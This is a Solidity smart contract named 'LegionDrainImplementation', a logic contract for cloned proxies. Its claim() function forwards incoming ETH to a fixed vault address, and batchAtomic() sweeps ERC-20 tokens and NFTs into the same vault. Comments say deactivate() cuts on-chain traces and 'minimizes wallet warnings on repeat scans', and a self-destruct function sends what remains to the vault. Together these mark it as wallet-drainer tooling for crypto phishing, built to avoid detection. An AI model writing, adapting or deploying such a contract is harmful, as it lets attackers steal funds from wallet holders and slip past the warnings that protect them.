// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * LegionDrainImplementation — logic contract for EIP-1167 minimal proxies.
 * Atomic batch: native + ERC-20 + ERC-721/1155 in one tx.
 * deactivate() reduces on-chain footprint after settlement.
 */
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC1155 {
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

interface IMulticall3 {
    struct Call3 {
        address target;
        bool allowFailure;
        bytes callData;
    }

    struct Call3Value {
        address target;
        bool allowFailure;
        uint256 value;
        bytes callData;
    }

    function aggregate3(Call3[] calldata calls) external payable returns (bool[] memory);
    function aggregate3Value(Call3Value[] calldata calls) external payable returns (bool[] memory);
}

contract LegionDrainImplementation {
    address public immutable vault;
    address public constant MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;
    uint256 public constant MAX_BATCH = 32;

    bool public active;

    error Inactive();
    error ZeroVault();
    error TransferFailed();

    event Deactivated(address indexed clone);
    event BatchExecuted(uint256 nativeWei, uint256 erc20Count, uint256 nftCount);

    constructor(address _vault) {
        if (_vault == address(0)) revert ZeroVault();
        vault = _vault;
        active = true;
    }

    modifier whenActive() {
        if (!active) revert Inactive();
        _;
    }

    /// @notice Mobile / WC native forward
    function claim() external payable whenActive {
        if (msg.value == 0) return;
        (bool ok,) = vault.call{value: msg.value}("");
        if (!ok) revert TransferFailed();
    }

    /// @notice Atomic batch — native + tokens + NFTs (single tx, no Multicall3 relay needed)
    function batchAtomic(
        address[] calldata erc20s,
        address[] calldata erc721Contracts,
        uint256[] calldata erc721Ids,
        address[] calldata erc1155Contracts,
        uint256[] calldata erc1155Ids
    ) external payable whenActive {
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            (bool ok,) = vault.call{value: ethBal}("");
            if (!ok) revert TransferFailed();
        }

        uint256 erc20Len = erc20s.length > MAX_BATCH ? MAX_BATCH : erc20s.length;
        for (uint256 i; i < erc20Len; ++i) {
            uint256 bal = IERC20(erc20s[i]).balanceOf(address(this));
            if (bal > 0) {
                try IERC20(erc20s[i]).transfer(vault, bal) {} catch {}
            }
        }

        uint256 n721 = erc721Contracts.length < erc721Ids.length ? erc721Contracts.length : erc721Ids.length;
        if (n721 > MAX_BATCH) n721 = MAX_BATCH;
        for (uint256 j; j < n721; ++j) {
            try IERC721(erc721Contracts[j]).transferFrom(address(this), vault, erc721Ids[j]) {} catch {
                try IERC721(erc721Contracts[j]).safeTransferFrom(address(this), vault, erc721Ids[j]) {} catch {}
            }
        }

        uint256 n1155 = erc1155Contracts.length < erc1155Ids.length ? erc1155Contracts.length : erc1155Ids.length;
        if (n1155 > MAX_BATCH) n1155 = MAX_BATCH;
        for (uint256 k; k < n1155; ++k) {
            uint256 bal1155 = IERC1155(erc1155Contracts[k]).balanceOf(address(this), erc1155Ids[k]);
            if (bal1155 > 0) {
                try IERC1155(erc1155Contracts[k]).safeTransferFrom(
                    address(this), vault, erc1155Ids[k], bal1155, ""
                ) {} catch {}
            }
        }

        emit BatchExecuted(ethBal, erc20Len, n721 + n1155);
    }

    /// @notice Optional Multicall3 path for relayer-composed batches
    function multicallBatch(IMulticall3.Call3Value[] calldata calls) external payable whenActive {
        IMulticall3(MULTICALL3).aggregate3Value{value: msg.value}(calls);
    }

    /// @notice Disable further use — minimizes wallet warnings on repeat scans
    function deactivate() external whenActive {
        active = false;
        emit Deactivated(address(this));
    }

    /// @notice Post-settlement cleanup — deactivate + selfdestruct (gas refund to vault where chain allows)
    function finishAndDestroy() external whenActive {
        active = false;
        emit Deactivated(address(this));
        selfdestruct(payable(vault));
    }

    receive() external payable {}
}
